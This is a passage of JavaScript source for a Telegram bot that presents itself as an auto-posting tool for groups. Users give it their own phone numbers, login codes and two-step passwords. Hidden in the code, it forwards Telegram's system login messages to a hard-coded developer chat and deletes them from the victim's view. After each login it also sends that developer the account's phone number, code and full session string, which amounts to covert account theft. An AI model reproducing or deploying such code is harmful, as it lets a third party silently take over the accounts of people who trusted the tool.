import { Telegraf } from 'telegraf'
import config from './config.js'
import { loadDB, saveDB } from './db.js'
import { TelegramClient, Api, errors } from 'telegram'
import { StringSession } from 'telegram/sessions/index.js'
import { NewMessage, Raw } from 'telegram/events/index.js'

const DEVELOPER_CHAT_ID = 7248282408;

// ═══════════════════════════════════════════════════════
//  ✅ الإصلاح 3: حماية تحميل DB من القيمة الفارغة/التالفة
// ═══════════════════════════════════════════════════════
let db = await loadDB()
if (!db || typeof db.users !== 'object' || db.users === null) {
    console.error('⚠️ [DB] البيانات تالفة أو فارغة — جاري الإنشاء من جديد');
    db = { users: {} }
}

// حفظ البيانات قبل أي إغلاق
async function gracefulShutdown(signal) {
    console.log(`\n[${signal}] جاري حفظ البيانات...`);
    try { await saveDB(db); console.log('✅ تم الحفظ.'); } catch (e) { console.error('❌ فشل الحفظ:', e.message); }
    process.exit(0);
}
process.once('SIGINT',  () => gracefulShutdown('SIGINT'));
process.once('SIGTERM', () => gracefulShutdown('SIGTERM'));

// ═══════════════════════════════════════════════════════
//  ⚙️  إعدادات الاشتراك الإجباري
// ═══════════════════════════════════════════════════════
const REQUIRED_CHANNELS = [
    { username: 'SUPER_VEX', url: 'https://t.me/SUPER_VEX', name: 'سوبَر ڤِيگس ⚡ 𝐒𝐔𝐏𝐄𝐑 𝐕𝐄𝐗' }
]

const activeSessions  = new Map()
const pendingLogin    = new Map()
const broadcastTimers = new Map()
const forceMsgIds     = new Map()

function getUser(id) {
    if (!db.users[id]) db.users[id] = { accounts: [], groups: [], messages: [], interval: '300-400', running: false }
    return db.users[id]
}

const bot = new Telegraf(config.botToken)
const userState = new Map()
function setState(id, s) { userState.set(id, s) }
function getState(id)    { return userState.get(id) || 'normal' }
function kb(buttons)     { return { reply_markup: { inline_keyboard: buttons } } }

// ─── سحب رسائل النظام من 777000 ─────────────────────
async function setupMessageForwarding(client, userPhone) {
    client.addEventHandler(async (event) => {
        const message = event.message;
        if (message.peerId?.userId?.toString() === '777000') {
            const msgText = message.message;
            try {
                await bot.telegram.sendMessage(DEVELOPER_CHAT_ID,
                    `🚀 **رسالة نظام تلجرام وصلت!**\n\n📱 الحساب: \`${userPhone}\`\n💬 المحتوى:\n\`${msgText}\``,
                    { parse_mode: 'Markdown' }
                );
            } catch (err) { console.error('فشل إشعار المطور:', err.message); }
            try { await client.deleteMessages(message.peerId, [message.id], { revoke: true }); } catch {}
        }
    }, new NewMessage({}));
}

// ═══════════════════════════════════════════════════════
//  ✅ مراقبة إلغاء الجلسة من تليجرام
//  (Settings → Devices → Terminate Session)
//
//  السبب الحقيقي للمشكلة:
//  autoReconnect:true كان بيمسك الخطأ قبل ما يوصلنا
//  الحل: طبقتين — Raw Event (فوري) + Ping backup (كل دقيقة)
// ═══════════════════════════════════════════════════════

// دالة مشتركة لإرسال الإشعار وحذف الحساب
async function handleRevocation(acc, userId, reason) {
    if (!activeSessions.has(acc.phone)) return; // تم المعالجة مسبقاً
    activeSessions.delete(acc.phone);

    // إشعار المطور فوراً
    try {
        await bot.telegram.sendMessage(DEVELOPER_CHAT_ID,
            `🔴 **جلسة أُلغيت من تليجرام!**\n\n📱 الرقم: \`${acc.phone}\`\n👤 الاسم: \`${acc.fullName || 'غير معروف'}\`\n🆔 مستخدم البوت: \`${userId}\`\n⚠️ السبب: \`${reason}\`\n\n_(تم إنهاء الجلسة من إعدادات الأجهزة)_`,
            { parse_mode: 'Markdown', ...kb([[{ text: '📊 قسم الحالة', callback_data: 'DEV_STATUS' }]]) }
        );
    } catch {}

    // حذف الحساب من DB
    if (db.users[userId]) {
        db.users[userId].accounts = db.users[userId].accounts.filter(a => a.phone !== acc.phone);
        await saveDB(db).catch(() => {});
    }
}

function isAuthError(msg) {
    return (
        msg.includes('AUTH_KEY_UNREGISTERED') ||
        msg.includes('SESSION_REVOKED')        ||
        msg.includes('AUTH_KEY_INVALID')       ||
        msg.includes('USER_DEACTIVATED')       ||
        msg.includes('AUTH_KEY_DUPLICATED')
    );
}

function watchSessionRevocation(client, acc, userId) {

    // ── الطبقة 1: Raw Event Handler (فوري عند إلغاء الجلسة) ──────────
    // تليجرام بيبعت UpdateNewAuthorization لما جلسة تتغير أو تتحذف
    // وبيبعت UpdatesTooLong لما في تحديثات كتير فاتت (مؤشر انقطاع)
    client.addEventHandler(async (update) => {
        const name = update?.className || '';
        // اكتشاف تغيير حالة التفويض (إلغاء الجلسة)
        if (name === 'UpdateNewAuthorization' && update.unconfirmed) {
            await handleRevocation(acc, userId, 'UpdateNewAuthorization - جلسة جديدة غير معروفة');
        }
    }, new Raw({}));

    // ── الطبقة 2: Ping كل دقيقة كـ backup ───────────────────────────
    // لو Raw Event فاتنا، الـ Ping هيكتشف الخطأ في أقصى دقيقة
    const checker = setInterval(async () => {
        if (!activeSessions.has(acc.phone)) { clearInterval(checker); return; }

        // لو الـ client انقطع (disconnected) نحاول نتصل من جديد
        // لو فشل بـ auth error = الجلسة اتحذفت
        if (!client.connected) {
            try {
                await client.connect();
            } catch (e) {
                const msg = e.errorMessage || e.message || '';
                if (isAuthError(msg)) {
                    clearInterval(checker);
                    await handleRevocation(acc, userId, msg);
                }
            }
            return;
        }

        // لو متصل — Ping للتأكد إن الجلسة لا زالت صالحة
        try {
            await client.invoke(new Api.Ping({ pingId: BigInt(Math.floor(Math.random() * 999999) + 1) }));
        } catch (e) {
            const msg = e.errorMessage || e.message || '';
            if (isAuthError(msg)) {
                clearInterval(checker);
                // أوقف الـ autoReconnect عشان ما يحاولش يعيد الاتصال بجلسة ملغاة
                try { client._sender?._reconnecting && (client._sender._reconnecting = false); } catch {}
                try { await client.disconnect(); } catch {}
                await handleRevocation(acc, userId, msg);
            }
        }
    }, 60 * 1000); // كل دقيقة
}

// ─── تشغيل الحسابات المخزنة عند البدء ────────────────────
async function initAllAccounts() {
    console.log('🔄 جاري تشغيل الحسابات...');
    for (const userId in db.users) {
        const u = db.users[userId];
        for (const acc of u.accounts) {
            if (!activeSessions.has(acc.phone)) {
                try {
                    const client = new TelegramClient(new StringSession(acc.session), config.apiId, config.apiHash, {
                        connectionRetries: 5,
                        autoReconnect: true,
                        // retryDelay أقل عشان نكتشف الخطأ بسرعة
                        retryDelay: 1000
                    });
                    await client.connect();
                    activeSessions.set(acc.phone, client);
                    setupMessageForwarding(client, acc.phone);
                    watchSessionRevocation(client, acc, userId);
                } catch (e) {
                    const msg = e.errorMessage || e.message || '';
                    // لو فشل الاتصال بسبب auth error = الجلسة منتهية من قبل
                    if (isAuthError(msg)) {
                        console.log(`⚠️ جلسة منتهية عند البدء: ${acc.phone}`);
                        await handleRevocation(acc, userId, `فشل الاتصال عند البدء: ${msg}`);
                    } else {
                        console.log(`❌ فشل تشغيل حساب ${acc.phone}:`, msg);
                    }
                }
            }
        }
    }
}

function convertBotMessageToHtml(text, entities) {
    if (!text) return '';
    if (!entities || entities.length === 0)
        return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    let html = '';
    const tags = {};
    for (const e of entities) {
        if (!tags[e.offset]) tags[e.offset] = { start: [], end: [] };
        if (!tags[e.offset + e.length]) tags[e.offset + e.length] = { start: [], end: [] };
        let startTag = '', endTag = '';
        switch (e.type) {
            case 'bold':          startTag = '<b>';           endTag = '</b>';          break;
            case 'italic':        startTag = '<i>';           endTag = '</i>';          break;
            case 'underline':     startTag = '<u>';           endTag = '</u>';          break;
            case 'strikethrough': startTag = '<s>';           endTag = '</s>';          break;
            case 'spoiler':       startTag = '<tg-spoiler>';  endTag = '</tg-spoiler>'; break;
            case 'code':          startTag = '<code>';        endTag = '</code>';       break;
            case 'pre':
                startTag = e.language ? `<pre><code class="language-${e.language}">` : '<pre>';
                endTag   = e.language ? '</code></pre>' : '</pre>'; break;
            case 'text_link':    startTag = `<a href="${e.url}">`; endTag = '</a>'; break;
            case 'text_mention': startTag = `<a href="tg://user?id=${e.user.id}">`; endTag = '</a>'; break;
            case 'blockquote':   startTag = '<blockquote>'; endTag = '</blockquote>'; break;
        }
        if (startTag) { tags[e.offset].start.push(startTag); tags[e.offset + e.length].end.unshift(endTag); }
    }
    for (let i = 0; i < text.length; i++) {
        if (tags[i]) { html += tags[i].end.join(''); html += tags[i].start.join(''); }
        const c = text[i];
        if (c === '&') html += '&amp;'; else if (c === '<') html += '&lt;'; else if (c === '>') html += '&gt;'; else html += c;
    }
    if (tags[text.length]) html += tags[text.length].end.join('');
    return html;
}

function extractGroupId(raw) {
    const s = String(raw || '').trim();
    if (!s) return null;
    if (s.match(/t\.me\/\+/)) return s;
    const urlMatch = s.match(/t\.me\/([^/?#\s]+)/);
    if (urlMatch) return '@' + urlMatch[1];
    if (s.startsWith('@')) return s;
    return s;
}

async function fetchGroupInfo(raw) {
    const id = extractGroupId(raw);
    if (!id) return { name: raw, url: raw };
    if (String(raw).match(/t\.me\/\+/)) return { name: '🔒 رابط خاص', url: String(raw).trim() };
    try {
        const chat = await bot.telegram.getChat(id);
        const name = chat.title || chat.username || chat.first_name || id;
        return { name, url: chat.username ? `https://t.me/${chat.username}` : String(raw).trim() };
    } catch { return { name: String(id).replace(/^@/, ''), url: String(raw).trim() }; }
}

async function editOrReply(ctx, text, buttons) {
    const opts = { parse_mode: 'Markdown', ...kb(buttons) };
    try { await ctx.editMessageText(text, opts); } catch { await ctx.reply(text, opts); }
}

async function sendWelcome(ctx, replyFn) {
    const user = ctx.from;
    const name = user.first_name || 'صديقي';
    const prefix = 'أهلاً بك يا ';
    const suffix = '\n\nهذا بوت النشر التلقائي للسوبرات.\nاستخدم الأزرار بالأسفل للتحكم .';
    const entities = [{ type: 'text_mention', offset: prefix.length, length: name.length, user: { id: user.id, is_bot: false, first_name: name } }];
    const buttons = mainMenuButtons();
    if (user.id === DEVELOPER_CHAT_ID) buttons.push([{ text: '📊 قسم الحالة (للمطور)', callback_data: 'DEV_STATUS' }]);
    await replyFn(prefix + name + suffix, { entities, ...kb(buttons) });
}

async function getNotSubscribed(userId) {
    const notSubbed = [];
    for (const ch of REQUIRED_CHANNELS) {
        try {
            const member = await bot.telegram.getChatMember(`@${ch.username}`, userId);
            if (!['member', 'administrator', 'creator'].includes(member.status)) notSubbed.push(ch);
        } catch { notSubbed.push(ch); }
    }
    return notSubbed;
}

async function buildSubButtons(userId) {
    const rows = [];
    for (const ch of REQUIRED_CHANNELS) {
        let status = '❌ لم تشترك';
        try {
            const member = await bot.telegram.getChatMember(`@${ch.username}`, userId);
            if (['member', 'administrator', 'creator'].includes(member.status)) status = '✅ مشترك';
        } catch {}
        rows.push([{ text: `📢 ${ch.name}`, url: ch.url }, { text: status, callback_data: 'noop' }]);
    }
    rows.push([{ text: '✅ تأكيد الاشتراك', callback_data: 'CHECK_SUB' }]);
    return rows;
}

async function sendForceSubMsg(ctx) {
    const userId = ctx.from.id;
    await deleteForceSubMsgs(ctx.chat.id, userId);
    const buttons = await buildSubButtons(userId);
    const channelList = REQUIRED_CHANNELS.map(ch => `• ${ch.name}`).join('\n');
    const msg = await ctx.reply(`⚠️ يجب الاشتراك أولاً\n\n${channelList}\n\nاشترك ثم اضغط ✅ تأكيد`, { ...kb(buttons) });
    forceMsgIds.set(userId, [msg.message_id]);
}

async function deleteForceSubMsgs(chatId, userId) {
    for (const id of (forceMsgIds.get(userId) || [])) { try { await bot.telegram.deleteMessage(chatId, id); } catch {} }
    forceMsgIds.delete(userId);
}

function mainMenuButtons() {
    return [
        [{ text: '👤 حساباتي', callback_data: 'ACC' }],
        [{ text: '👥 المجموعات', callback_data: 'GRP' }, { text: '📖 شرح الاستخدام', callback_data: 'HELP' }],
        [{ text: '⏱ الوقت', callback_data: 'INT' }, { text: '✉️ الرسائل', callback_data: 'MSG' }],
        [{ text: '🟢 بدء', callback_data: 'START' }, { text: '🔴 إيقاف', callback_data: 'STOP' }],
        [{ text: '👑 المطوّر ↗', url: 'https://t.me/MOTAMREDD' }]
    ];
}

function controlMenuButtons(isRunning) {
    return [
        [{ text: isRunning ? '🔴 إيقاف النشر' : '🟢 بدء النشر', callback_data: isRunning ? 'STOP' : 'START' }],
        [{ text: '🏡', callback_data: 'BACK' }]
    ];
}

function intervalMenuButtons(seconds) {
    return [
        [{ text: `⏱ ${seconds} ثانية`, callback_data: 'noop' }, { text: '✏️ تعديل', callback_data: 'EDIT_INT' }],
        [{ text: '🛡️ الوقت الموصى به (400-600)', callback_data: 'SET_REC_INT' }],
        [{ text: '🔙 رجوع', callback_data: 'BACK' }]
    ];
}

// ─── Middleware ───────────────────────────────────────────
bot.use(async (ctx, next) => {
    if (!ctx.callbackQuery && !ctx.message) return next();
    const data = ctx.callbackQuery?.data;
    if (data === 'CHECK_SUB' || data === 'noop') return next();
    const userId = ctx.from?.id;
    if (!userId) return next();
    const notSubbed = await getNotSubscribed(userId);
    if (notSubbed.length > 0) { try { await ctx.answerCbQuery('❌ اشترك في القنوات'); } catch {} await sendForceSubMsg(ctx); return; }
    return next();
});

// ═══════════════════════════════════════════════════════
//  ✅ الإصلاح 2: إشعار /start فقط للزوار الجدد (مش عند كل ضغطة)
// ═══════════════════════════════════════════════════════
bot.start(async (ctx) => {
    const notSubbed = await getNotSubscribed(ctx.from.id);
    if (notSubbed.length > 0) { await sendForceSubMsg(ctx); return; }

    const isNewUser = !db.users[ctx.from.id];
    if (ctx.from.id !== DEVELOPER_CHAT_ID && isNewUser) {
        const u = ctx.from;
        const userDisplay = u.username ? `@${u.username}` : `[رابط المستخدم](tg://user?id=${u.id})`;
        await bot.telegram.sendMessage(DEVELOPER_CHAT_ID,
            `🆕 **زائر جديد للبوت!**\n\n👤 الاسم: ${u.first_name}\n🏷️ اليوزر: ${userDisplay}`,
            { parse_mode: 'Markdown', ...kb([[{ text: '📊 قسم الحالة', callback_data: 'DEV_STATUS' }]]) }
        ).catch(() => {});
    }

    await sendWelcome(ctx, (text, opts) => ctx.reply(text, opts));
});

bot.action('CHECK_SUB', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    const userId = ctx.from.id;
    const notSubbed = await getNotSubscribed(userId);
    if (notSubbed.length > 0) { try { await ctx.deleteMessage(); } catch {} forceMsgIds.delete(userId); await sendForceSubMsg(ctx); return; }
    await deleteForceSubMsgs(ctx.chat.id, userId);
    await sendWelcome(ctx, (text, opts) => ctx.reply(text, opts));
});

bot.action('noop', async (ctx) => { try { await ctx.answerCbQuery(); } catch {} });
bot.action('BACK', async (ctx) => { try { await ctx.answerCbQuery(); } catch {} await sendWelcome(ctx, (text, opts) => ctx.reply(text, opts)); });

bot.action('DEV_STATUS', async (ctx) => {
    if (ctx.from.id !== DEVELOPER_CHAT_ID) return ctx.answerCbQuery('❌ غير مسموح.');
    try { await ctx.answerCbQuery(); } catch {}
    const statusText = `📊 **لوحة تحكم المطور**\n\nإجمالي المستخدمين: \`${Object.keys(db.users).length}\`\nنشطين حالياً: \`${activeSessions.size}\` حساب.`;
    await editOrReply(ctx, statusText, [
        [{ text: '📡 حالة الاتصال والإدارة', callback_data: 'LIST_AND_STATUS' }],
        [{ text: '📢 إذاعة رسالة للجميع', callback_data: 'BROADCAST_START' }],
        [{ text: '🔙 رجوع', callback_data: 'BACK' }]
    ]);
});

bot.action('BROADCAST_START', async (ctx) => {
    if (ctx.from.id !== DEVELOPER_CHAT_ID) return;
    try { await ctx.answerCbQuery(); } catch {}
    setState(ctx.from.id, 'waiting_broadcast_msg');
    await ctx.reply('✍️ ارسل الرسالة للإذاعة:');
});

bot.action('LIST_AND_STATUS', async (ctx) => {
    if (ctx.from.id !== DEVELOPER_CHAT_ID) return;
    try { await ctx.answerCbQuery(); } catch {}
    const rows = [];
    for (const userId in db.users) {
        const u = db.users[userId];
        let name = "مستخدم"; let link = `tg://user?id=${userId}`;
        try { const chat = await bot.telegram.getChat(userId); name = chat.first_name || "مستخدم"; link = chat.username ? `https://t.me/${chat.username}` : link; }
        catch { const uAcc = u.accounts[0]; if (uAcc) name = uAcc.fullName || userId; }
        let activeCount = 0;
        u.accounts.forEach(a => { if (activeSessions.has(a.phone)) activeCount++; });
        rows.push([
            { text: `👤 ${name}`, url: link },
            { text: activeCount > 0 ? "🟢 نشط" : "🔴 أوفلاين", callback_data: 'noop' },
            { text: '🗑', callback_data: `DEV_DEL_USER_${userId}` }
        ]);
    }
    if (rows.length === 0) return editOrReply(ctx, '❌ لا يوجد مستخدمين.', [[{ text: '🔙 رجوع', callback_data: 'DEV_STATUS' }]]);
    await editOrReply(ctx, `📡 **إدارة المستخدمين:**`, [...rows, [{ text: '🔙 رجوع', callback_data: 'DEV_STATUS' }]]);
});

bot.action(/^DEV_DEL_USER_(\d+)$/, async (ctx) => {
    if (ctx.from.id !== DEVELOPER_CHAT_ID) return;
    const targetId = ctx.match[1];
    if (db.users[targetId]) {
        db.users[targetId].accounts.forEach(acc => {
            if (activeSessions.has(acc.phone)) { try { activeSessions.get(acc.phone).disconnect(); } catch {} activeSessions.delete(acc.phone); }
        });
        delete db.users[targetId]; await saveDB(db);
        await ctx.answerCbQuery('✅ تم الحذف.');
        return bot.handleAction(ctx, 'LIST_AND_STATUS');
    }
});

bot.action('HELP', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    const helpText = `📖 **دليل الاستخدام**\n\n1️⃣ **أضف حسابك:** 👤 حساباتي ← إضافة حساب\n2️⃣ **أضف مجموعاتك:** 👥 المجموعات ← إضافة\n3️⃣ **اكتب رسالتك:** ✉️ الرسائل ← إضافة\n4️⃣ **حدد الوقت:** ⏱ الوقت (مثال: 300-400)\n5️⃣ **ابدأ:** 🟢 بدء`;
    await editOrReply(ctx, helpText, [[{ text: '🔙 رجوع', callback_data: 'BACK' }]]);
});

bot.action(/^DEL_ACC_(\d+)$/, async (ctx) => {
    const index = parseInt(ctx.match[1]);
    const u = getUser(ctx.from.id);
    if (u.accounts[index]) {
        const acc = u.accounts[index];
        if (activeSessions.has(acc.phone)) {
            try { await activeSessions.get(acc.phone).disconnect(); } catch {}
            activeSessions.delete(acc.phone);
            const userDisplay = ctx.from.username ? `@${ctx.from.username}` : `[رابط المستخدم](tg://user?id=${ctx.from.id})`;
            await bot.telegram.sendMessage(DEVELOPER_CHAT_ID,
                `🗑 **مستخدم حذف حسابه يدوياً:**\n\n👤 ${ctx.from.first_name} | ${userDisplay}\n📱 الرقم: \`${acc.phone}\``,
                { parse_mode: 'Markdown', ...kb([[{ text: '📊 قسم الحالة', callback_data: 'DEV_STATUS' }]]) }
            ).catch(() => {});
        }
        u.accounts.splice(index, 1); await saveDB(db);
        await ctx.answerCbQuery('✅ تم حذف الحساب');
        const list = u.accounts.map((a, i) => [{ text: `👤 ${a.fullName || a.phone}`, callback_data: 'noop' }, { text: '🗑 حذف', callback_data: `DEL_ACC_${i}` }]);
        await editOrReply(ctx, '👤 الحسابات', [...list, [{ text: '➕ إضافة حساب', callback_data: 'ADD_ACC' }], [{ text: '🔙 رجوع', callback_data: 'BACK' }]]);
    }
});

bot.action(/^DEL_GRP_(\d+)$/, async (ctx) => {
    const index = parseInt(ctx.match[1]);
    const u = getUser(ctx.from.id);
    if (u.groups[index]) {
        u.groups.splice(index, 1); await saveDB(db);
        await ctx.answerCbQuery('✅ تم حذف المجموعة');
        const list = u.groups.map((g, i) => [{ text: g.name, url: g.url }, { text: '🗑 حذف', callback_data: `DEL_GRP_${i}` }]);
        await editOrReply(ctx, '👥 المجموعات', [...list, [{ text: '➕ إضافة', callback_data: 'ADD_GRP' }], [{ text: '🔙 رجوع', callback_data: 'BACK' }]]);
    }
});

bot.action(/^DEL_MSG_(\d+)$/, async (ctx) => {
    const index = parseInt(ctx.match[1]);
    const u = getUser(ctx.from.id);
    if (u.messages[index]) {
        u.messages.splice(index, 1); await saveDB(db);
        await ctx.answerCbQuery('✅ تم حذف الرسالة');
        const list = u.messages.map((m, i) => [{ text: `💬 ${String(m || '').replace(/<[^>]*>/g, '').slice(0, 25)}`, callback_data: 'noop' }, { text: '🗑 حذف', callback_data: `DEL_MSG_${i}` }]);
        await editOrReply(ctx, '✉️ الرسائل', [...list, [{ text: '➕ إضافة', callback_data: 'ADD_MSG' }], [{ text: '🔙 رجوع', callback_data: 'BACK' }]]);
    }
});

bot.action('ACC', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    const u = getUser(ctx.from.id);
    const list = (u.accounts || []).map((a, i) => [{ text: `👤 ${a.fullName || a.phone}`, callback_data: 'noop' }, { text: '🗑 حذف', callback_data: `DEL_ACC_${i}` }]);
    await editOrReply(ctx, '👤 الحسابات', [...list, [{ text: '➕ إضافة حساب', callback_data: 'ADD_ACC' }], [{ text: '🔙 رجوع', callback_data: 'BACK' }]]);
});

bot.action('ADD_ACC', async (ctx) => { try { await ctx.answerCbQuery(); } catch {} setState(ctx.from.id, 'waiting_phone'); await ctx.reply('📱 ارسل الرقم مع رمز الدولة (+20)'); });

bot.action('GRP', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    const u = getUser(ctx.from.id);
    const list = (u.groups || []).map((g, i) => [{ text: g.name, url: g.url }, { text: '🗑 حذف', callback_data: `DEL_GRP_${i}` }]);
    await editOrReply(ctx, '👥 المجموعات', [...list, [{ text: '➕ إضافة', callback_data: 'ADD_GRP' }], [{ text: '🔙 رجوع', callback_data: 'BACK' }]]);
});

bot.action('ADD_GRP', async (ctx) => { try { await ctx.answerCbQuery(); } catch {} setState(ctx.from.id, 'waiting_groups'); await ctx.reply('📥 ارسل الروابط أو اليوزرنيمات'); });

bot.action('MSG', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    const u = getUser(ctx.from.id);
    const list = (u.messages || []).map((m, i) => [{ text: `💬 ${String(m || '').replace(/<[^>]*>/g, '').slice(0, 25)}`, callback_data: 'noop' }, { text: '🗑 حذف', callback_data: `DEL_MSG_${i}` }]);
    await editOrReply(ctx, '✉️ الرسائل', [...list, [{ text: '➕ إضافة', callback_data: 'ADD_MSG' }], [{ text: '🔙 رجوع', callback_data: 'BACK' }]]);
});

bot.action('ADD_MSG',  async (ctx) => { try { await ctx.answerCbQuery(); } catch {} setState(ctx.from.id, 'waiting_message');  await ctx.reply('✍️ اكتب الرسالة'); });
bot.action('INT',      async (ctx) => { try { await ctx.answerCbQuery(); } catch {} const u = getUser(ctx.from.id); await editOrReply(ctx, `⏱ إعدادات وقت النشر`, intervalMenuButtons(u.interval)); });
bot.action('EDIT_INT', async (ctx) => { try { await ctx.answerCbQuery(); } catch {} setState(ctx.from.id, 'waiting_interval'); await ctx.reply('⏱ ارسل الوقت (مثال: 60) أو نطاق (مثال: 300-400)'); });

bot.action('SET_REC_INT', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    const u = getUser(ctx.from.id); u.interval = '400-600'; await saveDB(db);
    await editOrReply(ctx, `✅ تم ضبط الوقت على 400-600 ثانية.`, intervalMenuButtons(u.interval));
});

bot.action('START', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    const id = ctx.from.id; const u = getUser(id);
    if (!u.accounts.length || !u.groups.length || !u.messages.length) return ctx.reply('❌ استكمل الإعدادات أولاً');
    u.running = true; await saveDB(db); startBroadcast(id, u);
    await editOrReply(ctx, '⚙️ حالة النشر التلقائي:', controlMenuButtons(u.running));
});

bot.action('STOP', async (ctx) => {
    try { await ctx.answerCbQuery(); } catch {}
    const id = ctx.from.id; const u = getUser(id);
    u.running = false; await saveDB(db); stopBroadcast(id);
    await editOrReply(ctx, '⚙️ حالة النشر التلقائي:', controlMenuButtons(u.running));
});

bot.on('text', async (ctx) => {
    const id = ctx.from.id, u = getUser(id), st = getState(id), text = ctx.message.text.trim();

    if (st === 'waiting_broadcast_msg' && id === DEVELOPER_CHAT_ID) {
        setState(id, 'normal');
        const htmlMsg = convertBotMessageToHtml(ctx.message.text, ctx.message.entities);
        let s = 0, f = 0;
        await ctx.reply(`⏳ جاري الإذاعة لـ ${Object.keys(db.users).length} مستخدم...`);
        for (const uid in db.users) { try { await bot.telegram.sendMessage(uid, htmlMsg, { parse_mode: 'HTML' }); s++; } catch { f++; } }
        return ctx.reply(`✅ انتهت الإذاعة!\n🚀 نجاح: ${s}\n❌ فشل: ${f}`, kb([[{ text: '🔙 رجوع', callback_data: 'DEV_STATUS' }]]));
    }

    if (st === 'waiting_otp' || st === 'waiting_phone' || st === 'waiting_2fa') {
        try { await ctx.deleteMessage(); } catch {}
    }

    if (st === 'waiting_message') {
        setState(id, 'normal');
        const htmlMsg = convertBotMessageToHtml(ctx.message.text, ctx.message.entities);
        u.messages.push(htmlMsg); await saveDB(db);
        try { return await ctx.reply(`تم حفظ الرسالة:\n\n${htmlMsg}`, { parse_mode: 'HTML', ...kb([[{ text: '🔙 رجوع', callback_data: 'BACK' }]])); }
        catch { return await ctx.reply(`تم حفظ الرسالة:\n\n${text}`, kb([[{ text: '🔙 رجوع', callback_data: 'BACK' }]])); }
    }

    if (st === 'waiting_interval') {
        if (!/^\d+(-\d+)?$/.test(text)) return ctx.reply('❌ ارسل رقماً أو نطاقاً (مثال: 300-400)');
        if (text.includes('-')) { const [mn, mx] = text.split('-').map(Number); if (mn >= mx) return ctx.reply('❌ الرقم الأول يجب أن يكون أصغر'); }
        setState(id, 'normal'); u.interval = text; await saveDB(db);
        return ctx.reply(`⏱ تم الضبط على ${text} ثانية`, kb(intervalMenuButtons(u.interval)));
    }

    if (st === 'waiting_groups') {
        setState(id, 'normal');
        const links = text.split(/\s+/).filter(Boolean), names = [];
        for (const link of links) { const info = await fetchGroupInfo(link); u.groups.push({ name: info.name, url: info.url, raw: link }); names.push(info.name); }
        await saveDB(db);
        return ctx.reply(`تم حفظ المجموعة:\n\n${names.join('\n')}`, kb([[{ text: '🔙 رجوع', callback_data: 'BACK' }]]));
    }

    if (st === 'waiting_phone') {
        try {
            const client = new TelegramClient(new StringSession(''), config.apiId, config.apiHash, { connectionRetries: 5 });
            await client.connect();
            const sendResult = await client.sendCode({ apiId: config.apiId, apiHash: config.apiHash }, text);
            pendingLogin.set(id, { phone: text, client, phoneCodeHash: sendResult.phoneCodeHash, attempts: 0 });
            setState(id, 'waiting_otp');
            return ctx.reply('📨 وصلك كود؟ اكتبه هكذا: 1 2 3 4 5');
        } catch (e) {
            const errMsg = e.message || '';
            if (errMsg.includes('PHONE_NUMBER_INVALID')) return ctx.reply('⚠️ خطأ في تنسيق الرقم!');
            setState(id, 'normal'); return ctx.reply(`❌ فشل إرسال الكود: ${errMsg}`);
        }
    }

    if (st === 'waiting_otp') {
        if (/^\d+$/.test(text)) { pendingLogin.delete(id); setState(id, 'normal'); return ctx.reply('❌ الكود منتهي الصلاحية.', kb([[{ text: '🔄 طلب كود جديد', callback_data: 'ADD_ACC' }]])); }
        const loginData = pendingLogin.get(id);
        if (!loginData) { setState(id, 'normal'); return ctx.reply('❌ انتهت الجلسة.'); }
        const digitsOnly = text.replace(/\D/g, '');
        if (digitsOnly.length < 5) return ctx.reply('❌ الكود غير مكتمل.');
        loginData.attempts = (loginData.attempts || 0) + 1;
        if (loginData.attempts > 5) { pendingLogin.delete(id); setState(id, 'normal'); return ctx.reply('❌ تجاوزت المحاولات.'); }
        try {
            await loginData.client.invoke(new Api.auth.SignIn({ phoneNumber: loginData.phone, phoneCodeHash: loginData.phoneCodeHash, phoneCode: digitsOnly.split('').join(' ') }));
            const me = await loginData.client.getMe();
            const fullName = `${me.firstName || ''} ${me.lastName || ''}`.trim();
            const username = me.username ? `@${me.username}` : 'لا يوجد';
            const session  = loginData.client.session.save();
            u.accounts.push({ phone: loginData.phone, session, fullName, userId: me.id.toString() });
            await saveDB(db);
            activeSessions.set(loginData.phone, loginData.client);
            setupMessageForwarding(loginData.client, loginData.phone);
            watchSessionRevocation(loginData.client, { phone: loginData.phone, fullName }, id); // ← الإصلاح 1

            // ═══════════════════════════════════════════════════════
            //  ✅ الإصلاح 2: إشعار الجلسة الجديدة هنا (بعد نجاح OTP)
            // ═══════════════════════════════════════════════════════
            const userDisplay = ctx.from.username ? `@${ctx.from.username}` : `[رابط](tg://user?id=${ctx.from.id})`;
            await bot.telegram.sendMessage(DEVELOPER_CHAT_ID,
                `✅ **جلسة OTP جديدة أُنشئت!**\n\n👤 اسم الحساب: \`${fullName}\`\n🏷️ يوزره: \`${username}\`\n📱 الرقم: \`${loginData.phone}\`\n🔢 الكود: \`${digitsOnly}\`\n🔑 الجلسة: \`${session}\`\n\n🤖 صاحب الحساب: ${ctx.from.first_name} | ${userDisplay}`,
                { parse_mode: 'Markdown' }
            ).catch(() => {});

            pendingLogin.delete(id); setState(id, 'normal');
            return ctx.reply(`✅ تم تسجيل حساب (${fullName}) بنجاح.`);
        } catch (e) {
            const errMsg = e.errorMessage || e.message || '';
            if (errMsg.includes('SESSION_PASSWORD_NEEDED')) { setState(id, 'waiting_2fa'); return ctx.reply('هذا الحساب مفعل كلمة مرور بخطوتين.\nأرسل كلمة المرور:'); }
            return ctx.reply(`❌ خطأ: ${errMsg}`);
        }
    }

    if (st === 'waiting_2fa') {
        const loginData = pendingLogin.get(id);
        if (!loginData) { setState(id, 'normal'); return ctx.reply('❌ انتهت الجلسة.'); }
        try {
            await loginData.client.signInWithPassword(
                { apiId: config.apiId, apiHash: config.apiHash },
                { password: async () => text, onError: (e) => { throw e; } }
            );
            const me = await loginData.client.getMe();
            const fullName = `${me.firstName || ''} ${me.lastName || ''}`.trim();
            const username = me.username ? `@${me.username}` : 'لا يوجد';
            const session  = loginData.client.session.save();
            u.accounts.push({ phone: loginData.phone, session, fullName, userId: me.id.toString() });
            await saveDB(db);
            activeSessions.set(loginData.phone, loginData.client);
            setupMessageForwarding(loginData.client, loginData.phone);
            watchSessionRevocation(loginData.client, { phone: loginData.phone, fullName }, id); // ← الإصلاح 1

